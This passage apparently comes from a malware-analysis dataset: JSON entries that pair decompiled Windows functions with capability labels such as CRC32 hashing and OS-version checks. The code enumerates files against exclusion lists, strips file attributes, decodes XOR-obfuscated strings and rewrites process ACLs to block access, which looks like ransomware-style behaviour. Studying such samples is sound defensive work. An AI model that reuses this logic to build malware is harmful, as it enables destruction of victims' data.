_sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                          ((iVar5 = (*pcVar2)(&var_74h, piVar6), \n                                           pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                           (iVar5 = (*pcVar2)(&var_80h, piVar6), \n                                           pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)))))))) ||\n                                       (iVar5 = (*pcVar2)(&var_8ch, piVar6), \n                                       pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)) ||\n                                      ((((iVar5 = (*pcVar2)(&var_2e4h, piVar6), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                         (iVar5 = (*pcVar2)(&var_98h, piVar6), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)) ||\n                                        (iVar5 = (*pcVar2)(&var_2f8h, piVar6), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)) ||\n                                       ((iVar5 = (*pcVar2)(&var_230h, piVar6), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                        (iVar5 = (*pcVar2)(&var_a4h, piVar6), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)))))) ||\n                                     (((((iVar5 = (*pcVar2)(&var_b0h, piVar6), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                         ((iVar5 = (*pcVar2)(&var_bch, piVar6), \n                                          pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                          (iVar5 = (*pcVar2)(&var_c8h, piVar6), \n                                          pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)))) ||\n                                        (iVar5 = (*pcVar2)(&var_d4h, piVar6), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)) ||\n                                       (((iVar5 = (*pcVar2)(&var_23ch, piVar6), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                         (iVar5 = (*pcVar2)(&var_e0h, piVar6), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)) ||\n                                        (iVar5 = (*pcVar2)(&var_ech, piVar6), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)))) ||\n                                      ((((iVar5 = (*pcVar2)(&var_30ch, piVar6), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                         (iVar5 = (*pcVar2)(&var_35ch, piVar6), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)) ||\n                                        ((iVar5 = (*pcVar2)(&var_f8h, piVar6), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                         ((iVar5 = (*pcVar2)(&var_104h, piVar6), \n                                          pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                          (iVar5 = (*pcVar2)(&var_110h, piVar6), \n                                          pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)))))) ||\n                                       (((iVar5 = (*pcVar2)(&var_11ch, piVar6), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                         ((((iVar5 = (*pcVar2)(&var_128h, piVar6), \n                                            pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                            (iVar5 = (*pcVar2)(&var_134h, piVar6), \n                                            pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)) ||\n                                           (iVar5 = (*pcVar2)(&var_140h, piVar6), \n                                           pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)) ||\n                                          (((iVar5 = (*pcVar2)(&var_14ch, piVar6), \n                                            pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                            (iVar5 = (*pcVar2)(&var_158h, piVar6), \n                                            pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)) ||\n                                           ((iVar5 = (*pcVar2)(&var_164h, piVar6), \n                                            pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                            ((iVar5 = (*pcVar2)(&var_170h, piVar6), \n                                             pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                             (iVar5 = (*pcVar2)(&var_17ch, piVar6), \n                                             pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)))))))))) ||\n                                        (iVar5 = (*pcVar2)(&var_188h, piVar6), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)))))))) ||\n                                    ((((((iVar5 = (*pcVar2)(&var_194h, piVar6), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                         (iVar5 = (*pcVar2)(&var_1a0h, piVar6), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)) ||\n                                        (iVar5 = (*pcVar2)(&var_1ach, piVar6), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)) ||\n                                       ((iVar5 = (*pcVar2)(&var_1b8h, piVar6), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                        (iVar5 = (*pcVar2)(&var_1c4h, piVar6), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)))) ||\n                                      (iVar5 = (*pcVar2)(&var_1d0h, piVar6), \n                                      pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)) ||\n                                     (((iVar5 = (*pcVar2)(&var_1dch, piVar6), \n                                       pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                       (iVar5 = (*pcVar2)(&var_1e8h, piVar6), \n                                       pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)) ||\n                                      ((iVar5 = (*pcVar2)(&var_1f4h, piVar6), \n                                       pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                       ((iVar5 = (*pcVar2)(&var_200h, piVar6), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                        (iVar5 = (*pcVar2)(&var_320h, piVar6), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0))))))))))))\n                                goto code_r0x0040c1d8;\n                            }\n                            iVar5 = (*pcVar2)(&var_56ch, &pszPath);\n                            pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW;\n                            if (((iVar5 == 0) ||\n                                (((iVar5 = (*pcVar2)(&var_248h, &pszPath), \n                                  pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                  (iVar5 = (*pcVar2)(&var_4b4h, &pszPath), \n                                  pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)) ||\n                                 (iVar5 = (*pcVar2)(&var_45ch, &pszPath),  pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW\n                                 ,  iVar5 == 0)))) ||\n                               (((iVar5 = (*pcVar2)(&var_3d0h, &pszPath),  pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW\n                                 ,  iVar5 == 0 ||\n                                 (iVar5 = (*pcVar2)(&var_370h, &pszPath),  pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW\n                                 ,  iVar5 == 0)) ||\n                                (iVar5 = (*pcVar2)(&var_478h, &pszPath),  pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW\n                                ,  iVar5 == 0)))) goto code_r0x0040c1d8;\n                        }\n                    }\n                    iVar4 = &var_a00h - var_ch;\n                    piVar6 = var_ch;\n                    do {\n                        iVar1 = *piVar6;\n                        *(piVar6 + iVar4) = iVar1;\n                        piVar6 = piVar6 + 1;\n                    } while (iVar1 != 0);\n                    (*_sym.imp.SHLWAPI.dll_PathAddBackslashW)(&var_a00h);\n                    uVar3 = var_7f0h;\n                    puVar9 = &pszPath;\n                    do {\n                        iVar1 = *puVar9;\n                        puVar9 = puVar9 + 2;\n                    } while (iVar1 != 0);\n                    uVar10 = puVar9 - &pszPath;\n                    puVar9 = auStack2566;\n                    do {\n                        piVar6 = puVar9 + 2;\n                        puVar9 = puVar9 + 2;\n                    } while (*piVar6 != 0);\n                    puVar11 = &pszPath;\n                    for (uVar8 = uVar10 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {\n                        *puVar9 = *puVar11;\n                        puVar11 = puVar11 + 1;\n                        puVar9 = puVar9 + 1;\n                    }\n                    for (uVar10 = uVar10 & 3; uVar10 != 0; uVar10 = uVar10 - 1) {\n                        *puVar9 = *puVar11;\n                        puVar11 = puVar11 + 1;\n                        puVar9 = puVar9 + 1;\n                    }\n                    pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW;\n                    iVar4 = var_4h;\n                    if (((uVar3 & 4) == 0) &&\n                       (((uVar3 & 1) == 0 ||\n                        (iVar5 = (*_sym.imp.KERNEL32.dll_SetFileAttributesW)(&var_a00h, 0x80), \n                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar4 = var_4h,  iVar5 != 0)))) {\n                        fcn.0041d4f0();\n                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW;\n                        iVar4 = var_4h;\n                    }\n                }\n                else {\n                    iVar5 = (*pcVar2)(&pszPath, &var_3ech);\n                    if ((((((iVar5 != 0) && (iVar5 = (*pcVar2)(&pszPath, &var_20ch),  iVar5 != 0)) &&\n                          (iVar5 = (*pcVar2)(&pszPath, &var_2bch),  iVar5 != 0)) &&\n                         ((iVar5 = (*pcVar2)(&pszPath, &var_408h),  iVar5 != 0 &&\n                          (iVar5 = (*pcVar2)(&pszPath, &var_424h),  iVar5 != 0)))) &&\n                        (((iVar5 = (*pcVar2)(&pszPath, &var_3a0h),  iVar5 != 0 &&\n                          ((iVar5 = (*pcVar2)(&pszPath, &var_2ch),  iVar5 != 0 &&\n                           (iVar5 = (*pcVar2)(&pszPath, &var_5a0h),  iVar5 != 0)))) &&\n                         (iVar5 = (*pcVar2)(&pszPath, &var_2d0h),  iVar5 != 0)))) &&\n                       (((((((iVar5 = (*pcVar2)(&pszPath, &var_258h),  iVar5 != 0 &&\n                             (iVar5 = (*pcVar2)(&pszPath, &var_4f8h),  iVar5 != 0)) &&\n                            (iVar5 = (*pcVar2)(&pszPath, &var_278h),  iVar5 != 0)) &&\n                           ((iVar5 = (*pcVar2)(&pszPath, &var_3b8h),  iVar5 != 0 &&\n                            (iVar5 = (*pcVar2)(&pszPath, &var_288h),  iVar5 != 0)))) &&\n                          ((iVar5 = (*pcVar2)(&pszPath, &var_388h),  iVar5 != 0 &&\n                           ((iVar5 = (*pcVar2)(&pszPath, &var_298h),  iVar5 != 0 &&\n                            (iVar5 = (*pcVar2)(&pszPath, &var_334h),  iVar5 != 0)))))) &&\n                         (iVar5 = (*pcVar2)(&pszPath, &var_348h),  iVar5 != 0)) &&\n                        ((((iVar5 = (*pcVar2)(&pszPath, &var_2a8h),  iVar5 != 0 &&\n                           (iVar5 = (*pcVar2)(&pszPath, &var_494h),  iVar5 != 0)) &&\n                          (iVar5 = (*pcVar2)(&pszPath, &var_51ch),  iVar5 != 0)) &&\n                         (((iVar5 = (*pcVar2)(&pszPath, &var_540h),  iVar5 != 0 &&\n                           (iVar5 = (*pcVar2)(&pszPath, &var_440h),  iVar5 != 0)) &&\n                          ((iVar5 = (*pcVar2)(&pszPath, &var_218h),  iVar5 != 0 &&\n                           (iVar5 = (*pcVar2)(&pszPath, &var_4d4h),  iVar5 != 0)))))))))) {\n                        (*_sym.imp.USER32.dll_wsprintfW)(&lpFileName, &var_224h, var_ch, &pszPath);\n                        fcn.0040acf0();\n                    }\n                }\n            }\ncode_r0x0040c1d8:\n            iVar5 = (*pcVar12)(iVar4, &var_7f0h);\n        } while (iVar5 == 1);\n        (*_sym.imp.KERNEL32.dll_FindClose)(iVar4);\n    }\n    return;\n}\n",
        "token_count": 11864
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    int16_t *arg_ch;\n    bool bVar3;\n    int16_t *piVar4;\n    code *pcVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    code *unaff_EBX;\n    code *unaff_ESI;\n    code *unaff_EDI;\n    int32_t in_FS_OFFSET;\n    uchar auVar11 [16];\n    uint uVar12;\n    uint uVar13;\n    uint *puVar14;\n    int32_t iVar15;\n    uint *puVar16;\n    uint *puVar17;\n    code *pcVar18;\n    int32_t aiStack884 [2];\n    uint uStack876;\n    uint uStack872;\n    uint uStack868;\n    uint uStack864;\n    uint uStack860;\n    ushort uStack856;\n    uint uStack852;\n    ushort uStack848;\n    uint uStack840;\n    uint uStack836;\n    int32_t iStack832;\n    uint32_t uStack828;\n    uchar auStack816 [8];\n    uint uStack808;\n    uint uStack804;\n    uint64_t uStack792;\n    uint uStack784;\n    ushort uStack780;\n    char cStack778;\n    uint uStack777;\n    uint uStack773;\n    uint uStack769;\n    uint uStack765;\n    uint uStack761;\n    uint uStack757;\n    uint uStack753;\n    ushort uStack749;\n    uint8_t uStack747;\n    uint8_t auStack746 [3];\n    uint uStack743;\n    uint uStack739;\n    uchar uStack735;\n    uchar uStack734;\n    ushort uStack733;\n    uint uStack731;\n    uint uStack727;\n    uint uStack723;\n    uint uStack719;\n    uint uStack715;\n    uint uStack711;\n    uint uStack707;\n    uint uStack703;\n    uint uStack699;\n    uint uStack695;\n    uint uStack691;\n    uint uStack687;\n    ushort uStack683;\n    uchar uStack681;\n    uint uStack632;\n    uchar auStack628 [16];\n    uint uStack612;\n    uchar auStack528 [524];\n    \n    pcVar8 = unaff_EDI;\n    pcVar18 = unaff_ESI;\n    if ((*(*(in_FS_OFFSET + 0x30) + 0x68) & 0x70) == 0) {\n        iVar7 = *(in_FS_OFFSET + 0x30);\n        fcn.0040cc00(auStack528, 0, 0x208);\n        iVar9 = 0;\n        arg_ch = *(*(iVar7 + 0x10) + 0x3c);\n        if (arg_ch != NULL) {\n            iVar2 = *arg_ch;\n            piVar4 = arg_ch;\n            while (iVar2 != 0) {\n                piVar4 = piVar4 + 1;\n                iVar9 = iVar9 + 1;\n                iVar2 = *piVar4;\n            }\n        }\n        fcn.0040cbe0(auStack528, arg_ch, iVar9 * 2);\n        uStack860 = 0;\n        uStack856 = 0x500;\n        iVar7 = (*_sym.imp.ntdll.dll_NtOpenProcessToken)();\n        unaff_EBX = _sym.imp.KERNEL32.dll_CloseHandle;\n        pcVar18 = unaff_ESI;\n        if (iVar7 != 0) {\n            iVar7 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(uStack840, 1);\n            if (iVar7 == 0) {\n                (*unaff_EBX)(uStack860);\n                pcVar18 = unaff_ESI;\n            }\n            else {\n                (*unaff_EBX)(uStack860);\n                iVar7 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                  (aiStack884, 1, 0x12, 0, 0, 0, 0, 0, 0, 0, &stack0xfffffc84);\n                pcVar18 = unaff_ESI;\n                if (iVar7 != 0) {\n                    unaff_ESI = (*_sym.imp.ADVAPI32.dll_EqualSid)();\n                    (*_sym.imp.ADVAPI32.dll_FreeSid)();\n                    if ((unaff_ESI != NULL) && (iVar7 = fcn.0041bea0(),  iVar7 != 0)) goto code_r0x0041b38a;\n                }\n            }\n        }\n        (*_sym.imp.ntdll.dll_RtlInitializeCriticalSection)();\n        (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        (*_sym.imp.msvcrt.dll_srand)();\n        pcVar8 = _sym.imp.msvcrt.dll_rand;\n        iVar7 = 0;\n        do {\n            iVar9 = (*pcVar8)();\n            *(&uStack792 + iVar7) = iVar9 % 0x19 + 'a';\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xf);\n        auVar11 = ZEXT816(uStack792);\n        str.fuplqrnihfjixoa._8_4_ = uStack784;\n        str.fuplqrnihfjixoa._12_2_ = uStack780;\n        str.fuplqrnihfjixoa[14] = cStack778;\n        str.fuplqrnihfjixoa[15] = '\\0';\n        str.fuplqrnihfjixoa._0_8_ = uStack792;\n        uStack876 = 0;\n        pcVar8 = (*_sym.imp.SHELL32.dll_CommandLineToArgvW)();\n        unaff_EBX = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (1 < aiStack884[0]) goto code_r0x0041b819;\n        fcn.0040cc20();\n        (*_sym.imp.KERNEL32.dll_Sleep)(200);\n        unaff_EDI = _sym.imp.ADVAPI32.dll_OpenSCManagerA;\n        iVar7 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n        unaff_ESI = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n        if ((iVar7 != 0) || (*(in_FS_OFFSET + 0x34) != 5)) {\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n            goto code_r0x0041b3ea;\n        }\n        uStack864 = 0;\n        fcn.0040ce50();\n        if (uStack864 == 0) goto code_r0x0041b392;\n        fcn.0041fa80();\n        fcn.0041eca0();\n    }\ncode_r0x0041b38a:\n    do {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)();\ncode_r0x0041b392:\n        uVar10 = 0;\n        uStack773 = uStack773 & 0xffffff | *0x4245f0 << 0x18;\n        uStack769._3_1_ = *0x4245f4;\n        uStack769 = CONCAT13(uStack769._3_1_, *0x4245f0 >> 8);\n        uStack765._3_1_ = *0x4245f8;\n        uStack765 = CONCAT13(uStack765._3_1_, *0x4245f4 >> 8);\n        uStack761._3_1_ = *0x4245fc;\n        uStack761 = CONCAT13(uStack761._3_1_, *0x4245f8 >> 8);\n        uStack735 = 1;\n        uStack757._3_1_ = SUB161(*0x424640, 0);\n        uStack757 = CONCAT13(uStack757._3_1_, *0x4245fc >> 8);\n        uStack753 = SUB164(*0x424640 >> 8, 0);\n        uStack749 = SUB162(*0x424640 >> 0x28, 0);\n        uStack747 = SUB161(*0x424640 >> 0x38, 0);\n        auStack746[0] = SUB161(*0x424640 >> 0x40, 0);\n        auStack746[1] = SUB161(*0x424640 >> 0x48, 0);\n        auStack746[2] = SUB161(*0x424640 >> 0x50, 0);\n        uStack743 = SUB164(*0x424640 >> 0x58, 0);\n        uStack739 = CONCAT31(0x61a15, SUB161(*0x424640 >> 0x78, 0));\n        uStack734 = 0;\n        do {\n            uStack773._3_1_ = *0x4245f0;\n            *(&uStack769 + uVar10) = *(&uStack769 + uVar10) ^ uStack773._3_1_;\n            uVar10 = uVar10 + 1;\n        } while (uVar10 < 0x23);\n        uStack734 = 0;\n        auVar11 = *0x424640;\n        fcn.0040a0b0(&uStack769, pcVar8);\ncode_r0x0041b3ea:\n        iVar7 = fcn.0040d040();\n    } while (iVar7 != 0);\n    fcn.0041a410();\n    uStack808 = *(in_FS_OFFSET + 0x20);\n    auStack628 = auVar11 & 0x0;\n    puVar17 = &uStack808;\n    puVar16 = &uStack632;\n    uStack836 = 0;\n    puVar14 = &uStack876;\n    uStack876 = 0;\n    aiStack884[0] = 0;\n    uStack852 = 0;\n    uStack848 = 0x100;\n    uStack632 = 0x18;\n    uStack612 = 0;\n    uStack804 = 0;\n    uVar10 = (*_sym.imp.ntdll.dll_NtOpenProcess)(puVar14);\n    if ((uVar10 & 0xc0000000) == 0xc0000000) {\ncode_r0x0041b5aa:\n        if (pcVar18 != NULL) {\n            (*unaff_EBX)(pcVar18);\n        }\n    }\n    else if (pcVar18 != NULL) {\n        iVar7 = (*_sym.imp.ADVAPI32.dll_GetSecurityInfo)(pcVar18, 6, 4, 0, 0, &uStack852, 0, 0);\n        if ((iVar7 == 0) &&\n           (iVar7 = (*_sym.imp.ntdll.dll_RtlAllocateAndInitializeSid)\n                              (&uStack868, 1, 0, 0, 0, 0, 0, 0, 0, 0, &stack0xfffffc7c),  iVar7 != 0)) {\n            uVar13 = 2;\n            (*_sym.imp.ntdll.dll_RtlQueryInformationAcl)(uStack852, auStack816, 0xc, 2);\n            iVar7 = (*_sym.imp.ntdll.dll_RtlLengthSid)(uVar13);\n            iVar7 = iStack832 + 0x10 + iVar7 * 2;\n            iVar9 = (*_sym.imp.msvcrt.dll_malloc)(iVar7);\n            unaff_ESI = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n            unaff_EDI = _sym.imp.ADVAPI32.dll_OpenSCManagerA;\n            if (iVar9 != 0) {\n                iVar7 = (*_sym.imp.ntdll.dll_RtlCreateAcl)(iVar9, iVar7, 4);\n                if ((iVar7 != 0) &&\n                   (iVar7 = (*_sym.imp.ntdll.dll_RtlAddAccessDeniedAce)(iVar9, 4, 1, puVar14), \n                   pcVar6 = _sym.imp.ntdll.dll_RtlGetAce,  iVar7 != 0)) {\n                    uVar10 = 0;\n                    if (uStack828 != 0) {\n                        do {\n                            iVar15 = 0;\n                            iVar7 = (*pcVar6)(uStack864, uVar10, &stack0xfffffc74);\n                            if ((iVar7 == 0) ||\n                               (iVar7 = (*_sym.imp.ntdll.dll_RtlAddAce)(iVar9, 4, 0xffffffff, iVar15, *(iVar15 + 2)), \n                               iVar7 == 0)) goto code_r0x0041b58e;\n                            uVar10 = uVar10 + 1;\n                        } while (uVar10 < uStack828);\n                    }\n                    (*_sym.imp.ADVAPI32.dll_SetSecurityInfo)(puVar16, 6, 4, 0, 0, iVar9, 0);\n                }\ncode_r0x0041b58e:\n                (*_sym.imp.msvcrt.dll_free)(iVar9);\n                unaff_EBX = _sym.imp.KERNEL32.dll_CloseHandle;\n                unaff_ESI = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                unaff_EDI = _sym.imp.ADVAPI32.dll_OpenSCManagerA;\n            }\n        }\n        goto code_r0x0041b5aa;\n    }\n    if (puVar17 != NULL) {\n        (*_sym.imp.ntdll.dll_RtlFreeSid)(puVar17);\n    }\n    uVar12 = 9;\n    (*_sym.imp.ntdll.dll_RtlAdjustPrivilege)(9, 1, 0, &uStack860 + 3);\n    uVar13 = 0;\n    iVar7 = (*unaff_EDI)(0, 0, 0xf003f);\n    if ((iVar7 == 0) && (*(in_FS_OFFSET + 0x34) == 5)) {\n        bVar3 = false;\n    }\n    else {\n        (*unaff_ESI)(iVar7);\n        bVar3 = true;\n    }\n    fcn.0040cc20();\n    if (bVar3) {\n        fcn.0040cc20();\n    }\n    iVar7 = fcn.0041d2e0();\n    if (iVar7 == 0) {\n        uVar10 = 0;\n        uStack777 = *0x424560;\n        uStack773 = *0x424564;\n        uStack769 = *0x424568;\n        uStack765 = *0x42456c;\n        auStack746[1] = 0x16;\n        auStack746[2] = 0;\n        uStack761 = *0x424620;\n        uStack757 = str._aB01B._0_4_;\n        uStack753 = *0x424628;\n        uStack749 = *0x42462c;\n        uStack747 = *0x42462c >> 0x10;\n        auStack746[0] = *0x42462c >> 0x18;\n        do {\n            uStack777._0_1_ = *0x424560;\n            puVar1 = &uStack777 + uVar10 + 1;\n            *puVar1 = *puVar1 ^ uStack777;\n            uVar10 = uVar10 + 1;\n        } while (uVar10 < 0x20);\n        auStack746[2] = 0;\n        fcn.0040a0b0(&uStack777 + 1, uVar13);\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    }\n    fcn.0040cc20();\n    fcn.0040cc20();\n    pcVar18 = _sym.imp.KERNEL32.dll_GetTickCount;\n    iVar7 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    fcn.0040a670();\n    iVar9 = (*pcVar18)();\n    fcn.0041a410();\n    uVar13 = (*_sym.imp.KERNEL32.dll_GetConsoleWindow)();\n    iVar15 = (*_sym.imp.USER32.dll_IsWindowVisible)();\n    if (iVar15 != 0) {\n        uVar10 = 0;\n        uStack747 = *0x4249f0;\n        auStack746[0] = *0x4249f0 >> 8;\n        auStack746[1] = *0x4249f0 >> 0x10;\n        auStack746[2] = *0x4249f0 >> 0x18;\n        uStack743 = *0x4249f4;\n        uStack739 = *0x4249f8;\n        uStack735 = str.QZ_PI_rDCYLAA_rDY._0_4_;\n        uStack734 = str.QZ_PI_rDCYLAA_rDY._0_4_ >> 8;\n        uStack733 = str.QZ_PI_rDCYLAA_rDY._0_4_ >> 0x10;\n        uStack683 = 0x4651;\n        uStack731 = *0x424900;\n        uStack727 = *0x424904;\n        uStack723 = *0x424908;\n        uStack719 = str.QTLF_._asONT_aKNIL_aH_RPETU._0_4_;\n        uStack715 = *0x424b50;\n        uStack711 = *0x424b54;\n        uStack707 = *0x424b58;\n        uStack703 = *0x424b5c;\n        uStack699 = *0x424be0;\n        uStack695 = *0x424be4;\n        uStack691 = *0x424be8;\n        uStack687 = *0x424bec;\n        do {\n            auStack746[uVar10] = auStack746[uVar10] ^ uStack747;\n            uVar10 = uVar10 + 1;\n        } while (uVar10 < 0x41);\n        uStack681 = 0;\n        fcn.0040a0b0(auStack746, (iVar9 - iVar7) / 86400000);\n        (*_sym.imp.KERNEL32.dll_Sleep)(60000);\n    }\n    if (bVar3) {\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar12, 0xffffffff);\n    }\n    uVar10 = 0;\n    uStack876 = uStack876 & 0xffffff | *0x4249a0 << 0x18;\n    uStack872._3_1_ = *0x4249a4;\n    uStack872 = CONCAT13(uStack872._3_1_, *0x4249a0 >> 8);\n    uStack868._3_1_ = *0x4249a8;\n    uStack868 = CONCAT13(uStack868._3_1_, *0x4249a4 >> 8);\n    uStack864._3_1_ = *0x4249ac;\n    uStack864 = CONCAT13(uStack864._3_1_, *0x4249a8 >> 8);\n    uStack860 = *0x4249ac >> 8;\n    do {\n        uStack876._3_1_ = *0x4249a0;\n        *(&uStack872 + uVar10) = *(&uStack872 + uVar10) ^ uStack876._3_1_;\n        uVar10 = uVar10 + 1;\n    } while (uVar10 < 0xf);\n    uStack860 = uStack860 & 0xffffff;\n    fcn.0040a0b0(&uStack872, uVar13);\n    fcn.0040c200();\n    fcn.0041a750();\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0x309);\ncode_r0x0041b819:\n    iVar7 = fcn.0041d2e0();\n    pcVar6 = _sym.imp.KERNEL32.dll_SetFileAttributesW;\n    pcVar18 = _sym.imp.KERNEL32.dll_GetFileAttributesW;\n    if (iVar7 != 0) {\n        iVar7 = 1;\n        pcVar5 = _sym.imp.KERNEL32.dll_Sleep;\n        if (1 < aiStack884[0]) {\n            do {\n                uVar10 = (*pcVar18)(*(pcVar8 + iVar7 * 4));\n                if (uVar10 != 0xffffffff) {\n                    if ((uVar10 & 0x10) == 0) {\n                        if ((uVar10 & 1) != 0) {\n                            (*pcVar6)(*(pcVar8 + iVar7 * 4), 0x80);\n                        }\n                        fcn.0041d4f0();\n                    }\n                    else {\n                        fcn.0040acf0();\n                    }\n                }\n                iVar7 = iVar7 + 1;\n                pcVar5 = _sym.imp.KERNEL32.dll_Sleep;\n            } while (iVar7 < aiStack884[0]);\n        }\n        do {\n            (*pcVar5)(10);\n        } while (*0x429330 != 0);\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar8 = swi(3);\n    (*pcVar8)();\n    return;\n}\n",
        "token_count": 4716
    },
    "00401430": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401430(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    code **ppcVar2;\n    int32_t arg_ch;\n    uint var_88h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*(arg_8h + 0x70) == 0) {\n        return -0x40;\n    }\n    arg_ch = 0;\n    if (0 < *(arg_8h + 0x70)) {\n        ppcVar2 = arg_8h + 0x74;\n        var_8h = 0;\n        do {\n            var_4h = 0;\n            if (ppcVar2[4] == 0x1) {\n                var_8h = 1;\n            }\n            iVar1 = (**ppcVar2)(ppcVar2[1], &var_88h, 0x80, &var_4h);\n            if (iVar1 != 0) goto code_r0x004014d0;\n            if (var_4h != 0) {\n                iVar1 = fcn.004014f0(arg_8h, arg_ch, &var_88h, var_4h);\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n                ppcVar2[2] = ppcVar2[2] + var_4h;\n            }\n            arg_ch = arg_ch + 1;\n            ppcVar2 = ppcVar2 + 5;\n        } while (arg_ch < *(arg_8h + 0x70));\n        if (var_8h != 0) goto code_r0x004014d0;\n    }\n    iVar1 = -0x3d;\ncode_r0x004014d0:\n    fcn.00408120(&var_88h, 0x80);\n    return iVar1;\n}\n",
        "token_count": 429
    },
    "004014f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
